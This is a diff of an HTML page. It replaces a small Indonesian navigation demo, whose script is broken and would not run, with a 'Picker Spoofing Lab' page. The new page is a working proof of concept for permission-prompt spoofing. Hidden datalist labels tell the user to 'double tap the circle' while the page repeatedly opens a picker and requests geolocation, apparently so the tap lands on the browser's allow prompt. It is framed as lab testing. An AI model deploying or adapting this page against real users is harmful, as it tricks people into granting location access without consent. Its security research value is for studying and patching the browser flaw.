@@ -1,55 +1,121 @@
-<!doctype html>
-<html lang="id">
-  <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Konteks Navigasi Terisolasi</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Advanced Picker Spoofing Lab (CVE-40067274 Context)</title>
     <style>
-      body {
-        margin: 0;
-        padding: 0;
-        height: 100vh;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        background-color: #f5f5f7;
-        font-family: system-ui, -apple-system, sans-serif;
-      }
-      .btn {
-        padding: 14px 28px;
-        font-size: 16px;
-        font-weight: 600;
-        color: #ffffff;
-        background-color: #007aff;
-        border: none;
-        border-radius: 10px;
-        cursor: pointer;
-        box-shadow: 0 2px 8px rgba(0,0,0,0.1);
-        transition: background-color 0.2s;
-      }
-      .btn:hover {
-        background-color: #0056b3;
-      }
-    </style>
-  </head>
-  <body>
-
-    <button id="execBtn" class="btn">Jalankan Navigasi Terisolasi</button>
-
-    <script>
-      document.getElementById("execBtn").onclick = function () {
-        // Membuka jendela baru dengan memutuskan referensi balik (noopener)
-        // Pengalihan langsung ke URL tujuan disarankan untuk menghindari modifikasi properti runtime
-        const newTab = window.href("https://google.com:9090#", "_self", "noopener,noreferrer");
-
-        if (newTab) {
-          // Logika internal non-blocking untuk manajemen status aplikasi
-          setTimeout(() => {
-            // Tempatkan pemrosesan data internal aplikasi Anda di sini
-            console.log("Konteks navigasi eksternal telah terisolasi sepenuhnya.");
-          }, 200;
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 40px;
+            background-color: #121212;
+            color: #e0e0e0;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            cursor: pointer;
         }
-      };
-    </script>
-  </body>
+        h1 {
+            color: #ff5252;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .info-box {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            padding: 15px;
+            border-radius: 6px;
+            max-width: 500px;
+            font-size: 13px;
+            color: #b0b0b0;
+            margin-top: 20px;
+            text-align: left;
+        }
+        code { background: #2d2d2d; color: #ff8a80; padding: 2px 4px; border-radius: 3px; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <h1>⚠️ Tap the screen to initialize lab test</h1>
+    <p style="font-size: 14px; color: #888;">Menguji siklus pemanggilan <code>showPicker()</code> dan interaksi izin asinkron.</p>
+
+    <!-- Elemen Input & Datalist Target -->
+    <input id="input" type="time" list="times" style="display:none;" />
+    <datalist id="times">
+        <select>
+            <option label="Double tap the circle to continue">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⬇️       ">00:00</option>
+            <option label="⭕      ">00:00</option>
+            <option label="">00:00</option>
+        </select>
+    </datalist>
+
+    <div class="info-box" id="log-box">
+        <strong>Status Log:</strong> Menunggu interaksi klik/sentuh pengguna...
+    </div>
+
+<script>
+    const logBox = document.getElementById('log-box');
+
+    function appendLog(msg) {
+        console.log(msg);
+        logBox.innerHTML += `<br>[${new Date().toLocaleTimeString()}] ${msg}`;
+    }
+
+    function showList() {
+        try {
+            // Memeriksa status izin geolokasi sebelum memicu picker
+            navigator.permissions.query({ name: 'geolocation' }).then(permissionStatus => {
+                if (permissionStatus.state === 'granted') {
+                    appendLog("Izin geolokasi sudah diberikan. Menghentikan simulasi picker.");
+                    return;
+                }
+
+                // Penguatan: Mencoba memanggil showPicker() dengan penanganan eksepsi aktif
+                input.showPicker();
+                appendLog("Berhasil memicu input.showPicker()");
+            }).catch(err => {
+                appendLog("Error pada permissions query: " + err.message);
+            });
+        } catch (e) {
+            appendLog("[DITOLAK/BLOCKED] showPicker() gagal: " + e.message);
+        }
+    }
+
+    document.body.onclick = async () => {
+        appendLog("Interaksi pengguna terdeteksi (User Activation sah).");
+        
+        // Eksekusi awal
+        showList();
+
+        // Penguatan Interval Berulang untuk menguji batas konsumsi user activation (ConsumeIfActive)
+        let attempt = 1;
+        const intervalId = setInterval(() => {
+            appendLog(`Mencoba pemanggilan berulang ke-${attempt}`);
+            showList();
+            attempt++;
+            
+            // Batasi hingga 5 kali percobaan interval untuk analisis lab
+            if (attempt > 5) {
+                clearInterval(intervalId);
+                appendLog("Pengujian interval selesai. Perhatikan respons konsumsi token aktivasi.");
+            }
+        }, 300);
+
+        // Memicu permintaan geolokasi asinkron secara paralel
+        navigator.geolocation.getCurrentPosition(
+            (pos) => { appendLog("Geolokasi diizinkan: " + pos.coords.latitude); },
+            (err) => { appendLog("Geolokasi ditolak/error: " + err.message); }
+        );
+    };
+</script>
+
+</body>
 </html>
